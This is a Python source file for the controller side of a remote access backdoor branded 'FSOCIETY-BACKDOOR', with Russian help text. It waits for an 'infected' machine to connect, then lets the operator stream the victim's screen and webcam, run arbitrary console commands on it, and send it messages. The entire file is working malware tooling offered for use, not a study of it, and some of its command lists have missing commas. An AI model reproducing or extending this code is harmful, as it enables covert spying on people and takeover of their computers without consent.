from vidstream import *
import socket
from colorama import init, Fore
import os
from prettytable import PrettyTable

logo = f'''{Fore.GREEN}
                 .,lx0XWMMMMMMWNKko:.                 
              .l0MMMMMMMMMMMMMMMMMMMMXo.              
            .dWMMMMMMMMMMMMMMMMMMMMMMMMWd.            
            KMMMMMMMMMMMMMMMMMMMMMMMMMMMMK            
            lkMMMMNXXWMMMMMMMMMMWXXNMMMMOl            
            '.xO:;ll. .oXMMMMXo' .cl;:OO.,            
            ,.:ONMMMWO;. .NW.  ;kWMMMNOl.;            
           .cOWd0MNxllxXk0MMKkXxllxNMOdWOc.           
           :MMMlWK.    ,M00MxM;    .KNlMMM:       ____________    
           kMMMMXOXWWKx0XlXMlO0xKWWXOXMMMMk     --|HIDDEN CLI|___       
           0MMO;KMMMMMMdOMMMMXcWMMMMMX:OMM0    |FSOCIETY-BACKDOOR|
           OMc .WMMMWKx;lXMM0l,d0WMMMN. cMO    -------------------       
           :N   .,,'.    .,'     .';,.  .M:           
            lc                         .xo            
             .kxoccc;..,,',,,;,..,cclox0'             
              .WMMMMMk,        'dWMMMMM,              
               KMMMMMMMNOxddx0NMMMMMMMK               
               'NMMMMMMMMMMMMMMMMMMMMM:               
                .OMMMMMMMMMMMMMMMMMMK,                
                  ,kMMMMMMMMMMMMMMO;                  
                    .lkKNMMMMWXOl.                    
'''


def per_help():
    commands_name = [
        "screen_get",
        "screen_stop",
        "webcam_get",
        "webcam_stop"
        "clear",
        "!",
        "message",
        "help"
    ]
    commands_description = [
        "Включить просмотр экрана",
        "Выключить просмотр экрана"
        "Включить лайв-режим вебки",
        "Выключить лайв-режим вебки"
        "Очистить консоль",
        "Выполнить консольную команду (! start cmd.exe)",
        "Отправить сообщение зараженному",
        "Увидеть доступные команды"
    ]

    table = PrettyTable([f"{Fore.GREEN}Имя команды{Fore.RESET}", f"{Fore.CYAN}Описание команды{Fore.RESET}"])

    for cn, cdesc in zip(commands_name, commands_description):
        table.add_row([cn, f"{Fore.YELLOW}{cdesc}{Fore.RESET}"])

    return table


init()

local_ip_address = '127.0.0.1'
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((local_ip_address, port))
print(logo)
s.listen(5)

client, addr = s.accept()
network_name = client.recv(1024).decode("utf-8")

print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")

server = StreamingServer(local_ip_address, 9999)
server.start_server()

print("[~] Servers was successfully started")

while True:
    cmd = input(f"{Fore.RED}{addr[0]}@{network_name}~#{Fore.RESET}{Fore.BLUE} ")

    if cmd == "screen_get":
        client.send(cmd.encode("utf-8"))

    elif cmd == 'screen_stop':
        client.send(cmd.encode('utf-8'))

    elif cmd == "webcam_get":
        client.send(cmd.encode("utf-8"))

    elif cmd == "webcam_stop":
        client.send(cmd.encode("utf-8"))

    elif cmd == "clear":
        os.system("cls")

    elif "!" in cmd:
        client.send(cmd.encode("utf-8"))

    elif cmd == "message":
        client.send(cmd.encode("utf-8"))

        print(f"{Fore.YELLOW}[1] Сообщение\n[2]Сообщение с ответом")
        message_cmd = input(f"> ")

        if message_cmd == "1":
            client.send(message_cmd.encode("utf-8"))

            umsg = input(f"сообщение>{Fore.RESET} ")
            client.send(umsg.encode("utf-8"))

        elif message_cmd == "2":
            client.send(message_cmd.encode("utf-8"))

            umsg = input(f"сообщение>{Fore.RESET} ")
            client.send(umsg.encode("utf-8"))

            print(f"{Fore.CYAN}Сообщение от зараженного:{Fore.RESET} {client.recv(4096).decode('utf-8')}\n")
        else:
            print("Неправильный аргумент!")
    elif cmd == "help":
        print(per_help())
